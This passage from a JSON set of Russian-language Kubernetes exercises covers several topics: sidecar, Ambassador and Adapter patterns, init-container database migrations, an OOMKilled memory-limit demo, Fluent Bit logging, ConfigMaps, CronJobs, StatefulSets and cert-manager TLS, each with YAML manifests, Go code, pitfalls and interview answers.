        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sidecar-demo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sidecar-demo\n  template:\n    metadata:\n      labels:\n        app: sidecar-demo\n    spec:\n      containers:\n        # Основной контейнер с бизнес-логикой\n        - name: app\n          image: alpine:3.21\n          command: [\"/bin/sh\", \"-c\"]\n          args:\n            - |\n              while true; do\n                echo \"HTTP/1.1 200 OK\\r\\nContent-Length: 18\\r\\n\\r\\nHello from Go App\" | nc -l -p 8080\n              done\n\n        # Sidecar контейнер: Nginx проксирует входящий трафик\n        - name: proxy-sidecar\n          image: nginx:1.27-alpine\n          ports:\n            - containerPort: 80"
      },
      {
        "filename": "main.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc main() {\n\t// Основной сервис слушает строго на localhost:8080\n\thttp.HandleFunc(\"/data\", func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintf(w, \"Ответ приложения, защищенного Sidecar-прокси\\n\")\n\t})\n\n\tfmt.Println(\"Внутренний сервис слушает на 127.0.0.1:8080\")\n\t_ = http.ListenAndServe(\"127.0.0.1:8080\", nil)\n}"
      }
    ],
    "under_the_hood": "Оба контейнера подключены к одному сетевому интерфейсу loopback `lo`. Трафик между Nginx и Go передается напрямую через стек сетевой памяти ядра Linux без выхода на сетевую карту сервера.",
    "pitfalls": "1. Конфликт портов: если оба контейнера попытаются слушать один и тот же порт (например, оба слушают 8080), один из них упадет с `bind: address already in use`.\n2. Порядок завершения: если sidecar умрет раньше основного приложения, приложение потеряет сеть. Начиная с K8s 1.29 поддержаны нативные Sidecar Containers через `initContainers` с `restartPolicy: Always`.\n3. Двойной расход ресурсов памяти.",
    "bigtech_interview": "**Вопрос с собеседования:** Как устроен стандарт Native Sidecar Containers, появившийся в Kubernetes 1.29+?\n**Ответ:** Исторически K8s не гарантировал порядок старта и остановки контейнеров в `spec.containers`: прокси-сайдкар мог запуститься позже приложения или умереть раньше него, обрывая соединения. \nВ K8s 1.29+ сайдкары объявляются в секции **`initContainers` с флагом `restartPolicy: Always`**. Kubelet гарантирует, что такой сайдкар запускается **до** основного приложения и завершается строго **после** него, решая историческую проблему порядка остановки сервисных прокси."
  },
  {
    "num": 72,
    "title": "Автоматизация миграций схемы базы данных через Init Containers",
    "task": "Используйте **Init Containers** для запуска миграций БД перед стартом основного приложения.",
    "theory": "Применение паттерна `Init Containers` для выполнения миграций схемы БД:\n- Init-контейнер запускает утилиту миграций (`goose`, `golang-migrate`) перед стартом веб-сервера.\n- Если миграция падает, основной контейнер не запускается.\n- Исключается запуск кода приложения со старой схемой данных.",
    "step_by_step": "1. Создайте манифест `deployment.yaml` с `initContainers`.\n2. Настройте запуск бинарника мигратора `migrate -path /migrations -database $DSN up`.\n3. В основном контейнере настройте запуск веб-сервера Go.\n4. Примените манифест.\n5. Убедитесь в логах, что миграция выполнена до старта сервера.",
    "code_blocks": [
      {
        "filename": "migration-deploy.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: user-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: user-service\n  template:\n    metadata:\n      labels:\n        app: user-service\n    spec:\n      initContainers:\n        - name: run-db-migrations\n          image: migrate/migrate:v4.17.0\n          command:\n            - /migrate\n            - -path=/migrations\n            - -database=$(DATABASE_URL)\n            - up\n          env:\n            - name: DATABASE_URL\n              valueFrom:\n                secretKeyRef:\n                  name: db-credentials\n                  key: DSN\n      containers:\n        - name: app\n          image: ghcr.io/company/user-service:v1.0.0\n          ports:\n            - containerPort: 8080"
      }
    ],
    "under_the_hood": "Kubelet ждет завершения процесса `migrate` с кодом 0. При падении контейнер перезапускается в соответствии с политикой экспоненциальной задержки.",
    "pitfalls": "1. Запуск миграций в Init-контейнере при нескольких репликах (`replicas: 5`): 5 подов начнут одновременно применять DDL миграции, вызывая блокировки. Для мультиреплик миграции выносят в отдельный `Job`.\n2. Отсутствие таймаута миграции.\n3. Несовместимые с предыдущей версией деструктивные миграции (DROP COLUMN).",
    "bigtech_interview": "**Вопрос с собеседования:** Почему при горизонтальном масштабировании (`replicas > 1`) запуск миграций внутри `initContainers` опасен, и как правильно организовывать миграции БД?\n**Ответ:** При старте 5 реплик все 5 initContainers одновременно подключатся к базе и начнут исполнять `migrate up`. Даже при наличии транзакционных локов в БД это создает огромную нагрузку и риск дедлоков. \nВ BigTech используют подход **Expand/Contract (двухфазные неломающие миграции)**: миграция запускается строго в **одном экземпляре через K8s Job** до развертывания новой версии. Код пишется так, чтобы новая схема поддерживала и старую версию приложения (Backward Compatibility), и новую."
  },
  {
    "num": 73,
    "title": "Исследование лимитов памяти: симуляция утечки памяти и статус OOMKilled",
    "task": "**Resource Limits и Memory OOMKilled**: Настройте в манифесте пода лимиты по памяти: `resources.limits.memory: \"128Mi\"`. Напишите тест: запустите внутри Go-приложения код, который аллоцирует в цикле слайс объемом 200 МБ. Запустите деплой в K8s, посмотрите статус пода через `kubectl get pods` и зафиксируйте ошибку завершения процесса по нехватке памяти `OOMKilled` (Exit Code 137).",
    "theory": "Практическое исследование аварийного завершения контейнера по **OOMKilled**:\n- Лимит памяти: `resources.limits.memory: 64Mi`.\n- Аллокация в цикле Go превышает лимит.\n- Ядро Linux посылает сигнал `SIGKILL` (код завершения **137**).\n- K8s регистрирует причину `OOMKilled` и перезапускает под в цикле `CrashLoopBackOff`.",
    "step_by_step": "1. Создайте код на Go с аллокацией срезов байтов в цикле.\n2. В манифесте задайте `limits.memory: 64Mi`.\n3. Примените манифест.\n4. Наблюдайте за падением пода через `kubectl get pods -w`.\n5. Изучите причину падения через `kubectl describe pod`.",
    "code_blocks": [
      {
        "filename": "oom-deploy.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: oom-victim\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: oom-victim\n  template:\n    metadata:\n      labels:\n        app: oom-victim\n    spec:\n      containers:\n        - name: app\n          image: ghcr.io/company/oom-victim:v1.0.0\n          resources:\n            limits:\n              memory: \"64Mi\" "
      },
      {
        "filename": "main.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tfmt.Println(\"Запуск сервиса. Начинаем аллокацию памяти...\")\n\tvar memoryHolder [][]byte\n\n\tfor {\n\t\t// Аллокация порциями по 5 МБ\n\t\tblock := make([]byte, 5*1024*1024)\n\t\tfor i := range block {\n\t\t\tblock[i] = 1 // Принудительное касание памяти\n\t\t}\n\t\tmemoryHolder = append(memoryHolder, block)\n\t\tfmt.Printf(\"Всего аллоцировано: %d МБ\\n\", len(memoryHolder)*5)\n\t\ttime.Sleep(300 * time.Millisecond)\n\t}\n}"
      },
      {
        "filename": "verify-oom.sh",
        "lang": "bash",
        "code": "# Просмотр статуса завершения\nkubectl describe pod -l app=oom-victim | grep -A 4 \"Last State\"\n# Ожидаемый вывод:\n#   Reason:       OOMKilled\n#   Exit Code:    137"
      }
    ],
    "under_the_hood": "Подсистема `cgroup.memory` фиксирует превышение лимита `memory.max`. Ядро Linux вызывает `oom_kill_process()`, немедленно завершая процесс.",
    "pitfalls": "1. Недостаточный запас памяти для сборщика мусора Go.\n2. Игнорирование метрики `container_oom_events_total` в алертах Prometheus.\n3. Отсутствие флага `GOMEMLIMIT`.",
    "bigtech_interview": "**Вопрос с собеседования:** Почему команда `top` внутри Docker-контейнера в K8s часто показывает память всего физического сервера, а не лимиты контейнера?\n**Ответ:** Традиционные утилиты Linux (`top`, `free`, `ps`) читают статистику из виртуальной файловой системы `/proc/meminfo`, которая не изолирована в namespaces и показывает суммарные ресурсы физического хоста. \nРеальные ограничения контейнера лежат в `/sys/fs/cgroup/memory`. Чтобы утилиты внутри пода показывали корректную информацию, в кластерах используют проект **LXCFS**, который виртуализирует `/proc` для каждого контейнера."
  },
  {
    "num": 74,
    "title": "Паттерн проектирования Ambassador: проксирование внешних баз данных через sidecar",
    "task": "Настрой **Ambassador Pattern**: sidecar проксирует внешние сервисы. `app` обращается к `localhost:5432`, sidecar маршрутизирует на `postgres.external:5432` с TLS, retry, circuit breaker. Покажи transparent proxying.",
    "theory": "Паттерн **`Ambassador` (Посол)**:\n- Вспомогательный контейнер-сайдкар выступает в роли локального прокси для удаленных сервисов.\n- Основное приложение обращается к `localhost:5432` без знания о том, где реально расположена база данных.\n- Сайдкар-посол берет на себя:\n  - Шифрование mTLS соединения с облачной СУБД.\n  - Аутентификацию по IAM-токенам (например, **Cloud SQL Auth Proxy** в GCP / RDS IAM Proxy в AWS).\n  - Пул соединений и маршрутизацию шардов.",
    "step_by_step": "1. Создайте манифест с двумя контейнерами: Go-сервис и Cloud SQL Proxy.\n2. Go-сервис подключается к базе по адресу `localhost:5432`.\n3. Сайдкар проксирует соединение к удаленной СУБД по защищенному TLS туннелю.\n4. Разверните сервис.\n5. Протестируйте успешную работу SQL запросов.",
    "code_blocks": [
      {
        "filename": "ambassador-pod.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: billing-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: billing\n  template:\n    metadata:\n      labels:\n        app: billing\n    spec:\n      containers:\n        # Основное приложение: подключается к localhost\n        - name: app\n          image: ghcr.io/company/billing:v1.0.0\n          env:\n            - name: DB_HOST\n              value: \"127.0.0.1\"\n            - name: DB_PORT\n              value: \"5432\"\n\n        # Ambassador Sidecar: проксирует соединения в защищенную облачную БД\n        - name: cloud-sql-proxy\n          image: gcr.io/cloud-sql-connectors/cloud-sql-proxy:2.14.1\n          args:\n            - \"--structured-logs\"\n            - \"--port=5432\"\n            - \"my-project:region:my-db-instance\" "
      },
      {
        "filename": "main.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n)\n\nfunc main() {\n\thost := os.Getenv(\"DB_HOST\")\n\tport := os.Getenv(\"DB_PORT\")\n\n\tfmt.Printf(\"Подключение к базе данных через локальный Ambassador-прокси: %s:%s\\n\", host, port)\n\tfmt.Println(\"Приложение изолировано от деталей авторизации и сертификатов облачной БД.\")\n}"
      }
    ],
    "under_the_hood": "Сайдкар слушает порт 5432 на loopback-интерфейсе пода. При получении TCP-пакета сайдкар запрашивает временный TLS-сертификат у Cloud IAM API и открывает шифрованный туннель к удаленному инстансу базы данных.",
    "pitfalls": "1. Попытка основного приложения подключиться к БД раньше, чем Ambassador-прокси успел инициализироваться и открыть локальный сокет.\n2. Расход CPU сайдкаром на TLS шифрование при высоких RPS.\n3. Утечки соединений в пуле.",
    "bigtech_interview": "**Вопрос с собеседования:** В чем ключевое архитектурное отличие паттерна Sidecar от паттерна Ambassador?\n**Ответ:** \n- Обычный **`Sidecar`** расширяет функциональность самого приложения или перехватывает **входящий** трафик (терминация входящего TLS, сбор метрик, проксирование Ingress).\n- **`Ambassador`** специализируется на **исходящем** трафике приложения: он маскирует сложную удаленную сетевую топологию (шардирование, репликацию, облачные токены), представляя внешние сервисы как простые локальные эндпоинты `localhost`."
  },
  {
    "num": 75,
    "title": "Паттерн Sidecar для централизованного сбора логов через Fluentbit",
    "task": "Настройте **Sidecar containers** для логирования (fluent-bit), проксирования (envoy) или service mesh.",
    "theory": "Когда приложению требуется передавать логи специального формата или с дополнительным обогащением метаданными:\n- Основной контейнер Go пишет логи в разделяемый том `emptyDir`.\n- Sidecar-контейнер `fluent-bit` непрерывно считывает файл лога, парсит поля и отправляет данные в централизованное хранилище ElasticSearch/Kafka.\n- Изоляция ответственности: процесс Go освобожден от сетевых библиотек отправки логов.",
    "step_by_step": "1. Опишите общий том `volumes: name: shared-logs, emptyDir: {}`.\n2. Смонтируйте том в оба контейнера.\n3. Основной сервис пишет строки в `/var/log/app/events.log`.\n4. Fluent-bit читает файл и отправляет в центральное хранилище.\n5. Разверните манифест и проверьте логи.",
    "code_blocks": [
      {
        "filename": "sidecar-logs.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: logging-demo\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: logging-demo\n  template:\n    metadata:\n      labels:\n        app: logging-demo\n    spec:\n      volumes:\n        - name: shared-logs\n          emptyDir: {}\n      containers:\n        - name: app\n          image: alpine:3.21\n          command: [\"/bin/sh\", \"-c\"]\n          args:\n            - |\n              while true; do\n                echo \"{\\\"time\\\":\\\"$(date)\\\",\\\"level\\\":\\\"INFO\\\",\\\"msg\\\":\\\"User payment received\\\"}\" >> /var/log/app/events.log\n                sleep 5\n              done\n          volumeMounts:\n            - name: shared-logs\n              mountPath: /var/log/app\n\n        - name: log-shipper\n          image: fluent/fluent-bit:3.2\n          volumeMounts:\n            - name: shared-logs\n              mountPath: /var/log/app\n              readOnly: true"
      }
    ],
    "under_the_hood": "Том `emptyDir` создается на быстром SSD-диске ноды или в памяти `tmpfs`. Файловая система является общей для обоих контейнеров пода.",
    "pitfalls": "1. Разрастание лог-файла на `emptyDir`: без ротации диск ноды быстро заполнится на 100%.\n2. Двойное потребление памяти (два процесса в одном поде).\n3. Предпочтительнее использовать стандартный DaemonSet сбор логов со stdout.",
    "bigtech_interview": "**Вопрос с собеседования:** Почему сбор логов через Sidecar-контейнер в каждом поде считается более ресурсоемким решением, чем единый DaemonSet на ноде?\n**Ответ:** Если в кластере запущено 1 000 подов, то при подходе Sidecar запускается 1 000 отдельных инстансов Fluent-bit, каждый из которых потребляет по 50–100 МБ памяти (суммарно до 100 ГБ ОЗУ на кластер только на сборщики!). \nЕдиный **DaemonSet** запускает ровно одного агента на каждую ноду (например, 20 нод = 20 агентов), экономя десятки гигабайт памяти и процессорных ядер кластера."
  },
  {
    "num": 76,
    "title": "Экстернализация настроек микросервиса через ConfigMap",
    "task": "**Конфигурация (ConfigMap)**: Зашивать настройки в Docker-образ — антипаттерн. Создай `configmap.yaml` со словарем (ключ `SERVER_PORT: 8080`). Прокинь это значение внутрь пода как переменную окружения (Env Var). Сделай так, чтобы твое Go-приложение читало порт из `os.Getenv()`.",
    "theory": "Зашивание настроек (порты, таймауты, флаги функционала) в Docker-образ — грубый антипаттерн, нарушающий переносимость:\n- Один и тот же образ должен запускаться на локальной машине, тестовом стенде и в боевом кластере.\n- `ConfigMap` выносит параметры во внешний декларативный YAML.",
    "step_by_step": "1. Создайте `configmap.yaml` с портами и переменными.\n2. Подключите ConfigMap в `deployment.yaml`.\n3. В коде Go прочитайте значения параметров.\n4. Примените конфигурацию: `kubectl apply -f .`.\n5. Убедитесь в корректности примененных настроек.",
    "code_blocks": [
      {
        "filename": "configmap.yaml",
        "lang": "yaml",
        "code": "apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: server-params\ndata:\n  HTTP_PORT: \"8080\"\n  APP_ENV: \"production\"\n  METRICS_ENABLED: \"true\" "
      },
      {
        "filename": "main.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n)\n\nfunc main() {\n\tport := os.Getenv(\"HTTP_PORT\")\n\tenv := os.Getenv(\"APP_ENV\")\n\tmetrics := os.Getenv(\"METRICS_ENABLED\")\n\n\tfmt.Printf(\"Конфигурация [Env: %s, Port: %s, Metrics: %s]\\n\", env, port, metrics)\n}"
      }
    ],
    "under_the_hood": "Kubelet связывает переменные процесса с etcd-деревом в момент создания контейнера.",
    "pitfalls": "1. Хранение секретов в ConfigMap.\n2. Несоответствие имен ключей.\n3. Отсутствие значений по умолчанию в коде Go.",
    "bigtech_interview": "**Вопрос с собеседования:** Как валидировать конфигурацию ConfigMap в CI/CD до ее попадания в кластер?\n**Ответ:** Используются инструменты статического анализа манифестов:\n1. `kubeconform` для проверки базовой схемы K8s.\n2. **`conftest` (Open Policy Agent)** для проверки корпоративных политик (например, «запретить значение `APP_ENV=prod` без TLS»).\n3. Юнит-тесты на Go, которые парсят и валидируют структуру конфигурационного файла с помощью JSON/YAML Schema."
  },
  {
    "num": 77,
    "title": "Регулярные фоновые задачи: CronJob для ночной очистки и регламентных работ",
    "task": "**[Jobs / CronJobs]**: Напиши `CronJob`, которая запускается каждый день в 2:00 ночи и выполняет Go-скрипт очистки старых записей из БД.",
    "theory": "Автоматизация регламентных задач по расписанию через `CronJob`:\n- Расписание `0 2 * * *` (ежедневно в 02:00 ночи).\n- Вызов специализированного Go-бинарника.\n- Автоматическое завершение и очистка истории подов.",
    "step_by_step": "1. Создайте код регламентной очистки в Go.\n2. Создайте манифест `cronjob.yaml`.\n3. Установите `concurrencyPolicy: Forbid`.\n4. Примените манифест.\n5. Протестируйте разовый запуск через `kubectl create job`.",
    "code_blocks": [
      {
        "filename": "cleanup-cronjob.yaml",
        "lang": "yaml",
        "code": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: night-cleanup\nspec:\n  schedule: \"0 2 * * *\"\n  concurrencyPolicy: Forbid\n  jobTemplate:\n    spec:\n      template:\n        spec:\n          restartPolicy: OnFailure\n          containers:\n            - name: cleaner\n              image: ghcr.io/company/cleaner:v1.0.0\n              command: [\"/bin/cleaner\", \"--mode=expired-sessions\"]"
      },
      {
        "filename": "cleaner.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tfmt.Printf(\"[%s] Запуск ночной регламентной очистки устаревших сессий...\\n\", time.Now().Format(time.RFC3339))\n\ttime.Sleep(2 * time.Second)\n\tfmt.Println(\"Очистка успешно завершена. Удалено 4 210 устаревших записей.\")\n}"
      }
    ],
    "under_the_hood": "`CronJobController` порождает объект `Job`, который создает изолированный Pod для выполнения задачи.",
    "pitfalls": "1. Забытый `restartPolicy: OnFailure`.\n2. Параллельный запуск двух экземпляров без `concurrencyPolicy: Forbid`.\n3. Засорение etcd историей завершенных подов.",
    "bigtech_interview": "**Вопрос с собеседования:** В чем разница между `restartPolicy: OnFailure` и `restartPolicy: Never` в K8s Job?\n**Ответ:** \n- При **`OnFailure`**: при падении процесса Kubelet перезапускает упавший контейнер **внутри того же самого Pod** на той же ноде.\n- При **`Never`**: Kubelet не перезапускает упавший контейнер; вместо этого JobController создает **совершенно новый Pod** (возможно, на другой свободной ноде кластера), сохраняя логи упавшего пода для последующего дебага."
  },
  {
    "num": 78,
    "title": "Паттерн проектирования Adapter: трансляция кастомных метрик в формат Prometheus",
    "task": "Настрой **Adapter Pattern**: sidecar преобразует интерфейс. `app` пишет metrics в файл, sidecar `prometheus-exporter` читает файл, exposes `/metrics`. Покажи interface adaptation.",
    "theory": "Паттерн **`Adapter` (Адаптер)**:\n- Используется, когда стороннее приложение или legacy-сервис пишет метрики в нестандартном виде (например, в локальный файл `/tmp/stats.txt` или в формате StatsD).\n- Контейнер-адаптер (Sidecar) читает эти данные, трансформирует их и отдает наружу в стандартном формате Prometheus по эндпоинту `/metrics`.\n- Вся система мониторинга работает единообразно без переписывания исходного кода приложения.",
    "step_by_step": "1. Создайте Deployment с двумя контейнерами и общим томом `emptyDir`.\n2. Контейнер 1 (Legacy App) периодически записывает число операций в файл `/stats/metrics.txt`.\n3. Контейнер 2 (Adapter) читает файл и отдает HTTP `/metrics` в формате OpenMetrics.\n4. Примените манифест.\n5. Протестируйте сбор метрик curl-запросом к адаптеру.",
    "code_blocks": [
      {
        "filename": "adapter-deployment.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: legacy-with-adapter\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: legacy-adapter\n  template:\n    metadata:\n      labels:\n        app: legacy-adapter\n    spec:\n      volumes:\n        - name: stats-vol\n          emptyDir: {}\n      containers:\n        # Legacy приложение: пишет метрики в файл\n        - name: legacy-app\n          image: alpine:3.21\n          command: [\"/bin/sh\", \"-c\"]\n          args:\n            - |\n              while true; do\n                echo \"active_orders:42\" > /stats/metrics.txt\n                sleep 5\n              done\n          volumeMounts:\n            - name: stats-vol\n              mountPath: /stats\n\n        # Контейнер-Адаптер на Go: отдает метрики в формате Prometheus\n        - name: prometheus-adapter\n          image: ghcr.io/company/adapter:v1.0.0\n          ports:\n            - containerPort: 9090\n          volumeMounts:\n            - name: stats-vol\n              mountPath: /stats\n              readOnly: true"
      },
      {
        "filename": "adapter.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"os\"\n\t\"strings\"\n)\n\nfunc main() {\n\thttp.HandleFunc(\"/metrics\", func(w http.ResponseWriter, r *http.Request) {\n\t\tdata, err := os.ReadFile(\"/stats/metrics.txt\")\n\t\tif err != nil {\n\t\t\thttp.Error(w, \"Ошибка чтения метрик\", 500)\n\t\t\treturn\n\t\t}\n\n\t\tparts := strings.Split(strings.TrimSpace(string(data)), \":\")\n\t\tif len(parts) == 2 {\n\t\t\t// Преобразование в формат Prometheus\n\t\t\tfmt.Fprintf(w, \"# HELP legacy_active_orders Число заказов из legacy файла\\n\")\n\t\t\tfmt.Fprintf(w, \"# TYPE legacy_active_orders gauge\\n\")\n\t\t\tfmt.Fprintf(w, \"legacy_active_orders %s\\n\", parts[1])\n\t\t}\n\t})\n\n\tfmt.Println(\"Prometheus Adapter слушает порт :9090\")\n\t_ = http.ListenAndServe(\":9090\", nil)\n}"
      }
    ],
    "under_the_hood": "Адаптер нормализует неоднородные интерфейсы микросервисов к корпоративному стандарту Observability (Prometheus pull model).",
    "pitfalls": "1. Гонка чтения-записи (Read-Write Race) при неатомарной перезаписи файла в `emptyDir`.\n2. Зависание адаптера при блокировке файла.\n3. Отсутствие обработки ошибок парсинга.",
    "bigtech_interview": "**Вопрос с собеседования:** В чем разница между архитектурными паттернами Sidecar, Ambassador и Adapter?\n**Ответ:** \n- **Sidecar:** Дополняет основной контейнер вспомогательной функциональностью (сбор логов, локальный reverse proxy).\n- **Ambassador:** Проксирует **исходящий** трафик приложения к внешнему миру (маскирует удаленную БД как `localhost`).\n- **Adapter:** Стандартизирует **выходной интерфейс** приложения для внешнего мира (преобразует кастомные логи или файлы метрик в единый стандарт Prometheus/OpenTelemetry)."
  },
  {
    "num": 79,
    "title": "Оркестрация распределенных хранилищ (Redis Cluster, Kafka) через StatefulSet",
    "task": "Создайте **StatefulSet** для stateful приложений (например, Redis Cluster, Kafka brokers).",
    "theory": "Развертывание распределенных СУБД (Redis Cluster, Kafka, ScyllaDB) в Kubernetes:\n- Каждая нода хранилища требует строго фиксированного DNS-имени (`redis-0`, `redis-1`, `redis-2`).\n- Каждая нода должна владеть собственным независимым диском (Persistent Volume).\n- Порядок старта и топология узлов строго фиксированы.\n- Управление реализуется через `StatefulSet` в связке с `Headless Service`.",
    "step_by_step": "1. Создайте Headless Service `redis-service` с `clusterIP: None`.\n2. Опишите `StatefulSet` с 3 репликами Redis.\n3. Добавьте `volumeClaimTemplates` с запросом диска 5Gi.\n4. Примените манифесты: `kubectl apply -f redis-stateful.yaml`.\n5. Проверьте стабильность имен подов и связку с PersistentVolumeClaims.",
    "code_blocks": [
      {
        "filename": "redis-stateful.yaml",
        "lang": "yaml",
        "code": "apiVersion: v1\nkind: Service\nmetadata:\n  name: redis-cluster\n  labels:\n    app: redis\nspec:\n  clusterIP: None\n  selector:\n    app: redis\n  ports:\n    - port: 6379\n      name: client\n---\napiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: redis-node\nspec:\n  serviceName: \"redis-cluster\"\n  replicas: 3\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n        - name: redis\n          image: redis:7-alpine\n          ports:\n            - containerPort: 6379\n          volumeMounts:\n            - name: redis-data\n              mountPath: /data\n  volumeClaimTemplates:\n    - metadata:\n        name: redis-data\n      spec:\n        accessModes: [ \"ReadWriteOnce\" ]\n        resources:\n          requests:\n            storage: 5Gi"
      },
      {
        "filename": "check-redis.sh",
        "lang": "bash",
        "code": "# Просмотр статуса подов StatefulSet\nkubectl get pods -l app=redis\n\n# Просмотр уникальных томов для каждого пода\nkubectl get pvc -l app=redis"
      }
    ],
    "under_the_hood": "StatefulSet Controller создает поды последовательно с предсказуемыми именами. При удалении пода связанный том PVC сохраняется в etcd и повторно монтируется к тому же поду при его восстановлении.",
    "pitfalls": "1. Использование обычного Deployment для баз данных с репликацией: при рестарте поды перепутают диски и данные разрушатся.\n2. Ручное удаление StatefulSet без флага каскадного удаления.\n3. Отсутствие PDB для защиты кворума реплик.",
    "bigtech_interview": "**Вопрос с собеседования:** Почему базы данных в Kubernetes чаще разворачивают через специализированные Операторы (например, Zalando Postgres Operator или CloudNativePG), а не голыми StatefulSet?\n**Ответ:** Голый `StatefulSet` умеет только упорядоченно создавать поды и монтировать диски. Он ничего не знает о внутренней специфике базы данных: он не умеет переключать Master при падении (Failover), не умеет настраивать потоковую репликацию (Streaming Replication), делать инкрементальные бэкапы в S3 (WAL-G) и выполнять плавающее обновление без потери транзакций. Все эти сложные задачи автоматизирует специализированный **Kubernetes Operator**."
  },
  {
    "num": 80,
    "title": "Автоматическое управление TLS-сертификатами в Ingress через cert-manager и Let's Encrypt",
    "task": "Настройте TLS-termination на ingress с использованием `cert-manager` для автоматического получения Let's Encrypt сертификатов.",
    "theory": "Ручной выпуск и обновление SSL/TLS сертификатов каждые 90 дней для сотен микросервисов нереализуемы в enterprise-масштабе.\n\n**`cert-manager`** — ведущий контроллер управления сертификатами в Kubernetes:\n- Поддерживает протокол ACME (Automatic Certificate Management Environment).\n- Автоматически выпускает бесплатные доверенные сертификаты от Let's Encrypt.\n- Проводит валидацию владения доменом через HTTP-01 или DNS-01 челленджи.\n- Автоматически перевыпускает сертификаты за 30 дней до окончания срока действия без участия человека.\n- Сохраняет сертификат в стандартный K8s Secret типа `kubernetes.io/tls`.",
    "step_by_step": "1. Установите cert-manager через официальный манифест или Helm.\n2. Создайте ресурс `ClusterIssuer` для Let's Encrypt Production.\n3. В манифесте `Ingress` добавьте аннотацию `cert-manager.io/cluster-issuer: letsencrypt-prod`.\n4. В секции `spec.tls` укажите домен и имя целевого секрета `secretName: api-tls-cert`.\n5. Примените манифест и убедитесь в получении валидного HTTPS-сертификата.",
    "code_blocks": [
      {
        "filename": "cluster-issuer.yaml",
        "lang": "yaml",
        "code": "apiVersion: cert-manager.io/v1\nkind: ClusterIssuer\nmetadata:\n  name: letsencrypt-prod\nspec:\n  acme:\n    server: https://acme-v02.api.letsencrypt.org/directory\n    email: security@company.com\n    privateKeySecretRef:\n      name: letsencrypt-prod-account-key\n    solvers:\n      - http01:\n          ingress:\n            class: nginx"
      },
      {
        "filename": "tls-ingress.yaml",
        "lang": "yaml",
        "code": "apiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: secure-api-ingress\n  annotations:\n    cert-manager.io/cluster-issuer: letsencrypt-prod\n    nginx.ingress.kubernetes.io/ssl-redirect: \"true\"\nspec:\n  ingressClassName: nginx\n  tls:\n    - hosts:\n        - api.company.com\n      secretName: api-company-tls\n  rules:\n    - host: api.company.com\n      http:\n        paths:\n          - path: /\n            pathType: Prefix\n            backend:\n              service:\n                name: api-service\n                port:\n                  number: 80"
      },
      {
        "filename": "verify-tls.sh",
        "lang": "bash",
        "code": "# Просмотр статуса заказа сертификата\nkubectl get certificate api-company-tls\n# Вывод:\n# NAME              READY   SECRET            AGE\n# api-company-tls   True    api-company-tls   2m\n\n# Проверка шифрования HTTPS curl-запросом\ncurl -Iv https://api.company.com/"
      }
    ],
    "under_the_hood": "`cert-manager` отслеживает ресурсы `Ingress` с аннотацией `cert-manager.io/cluster-issuer`. \n\nОн автоматически создает дочерний объект `Certificate` и `Order`. В кластере разворачивается временный под-челлендж HTTP-01, сервер Let's Encrypt обращается к `http://api.company.com/.well-known/acme-challenge/...` и подтверждает владение доменом. \n\nПосле успешной валидации сертификат и приватный ключ записываются в K8s Secret `api-company-tls`, а NGINX Ingress динамически подключает его к SSL-контексту.",
    "pitfalls": "1. Превышение лимитов Let's Encrypt (Rate Limits): постоянные ошибки при тестировании на боевом `letsencrypt-prod` (до 5 ошибок в час). Для тестов обязателен `letsencrypt-staging`.\n2. DNS не направлен на IP Ingress-контроллера: HTTP-01 челлендж завершится ошибкой таймаута.\n3. Блокировка пути `/.well-known/acme-challenge/` правилами rewrite.",
    "bigtech_interview": "**Вопрос с собеседования:** В чем разница между HTTP-01 и DNS-01 челленджами в `cert-manager` и когда DNS-01 безальтернативен?\n**Ответ:** \n- **`HTTP-01`** требует, чтобы сервис был доступен из публичного интернета по 80 порту (Let's Encrypt шлет проверочный HTTP-запрос). Он не работает для внутренних сервисов и не умеет выпускать Wildcard-сертификаты (`*.company.com`).\n- **`DNS-01`** создает проверочную TXT-запись в DNS-зоне через API провайдера (Cloudflare, AWS Route53). Он **безальтернативен для выпуска Wildcard-сертификатов** и для сервисов, находящихся в закрытом корпоративном VPN-контуре без прямого доступа из интернета."
  },
  {
    "num": 81,
    "title": "Хранение постоянных данных: PersistentVolume и PersistentVolumeClaim",
    "task": "Используйте **PersistentVolume** и **PersistentVolumeClaim** для stateful workloads.",
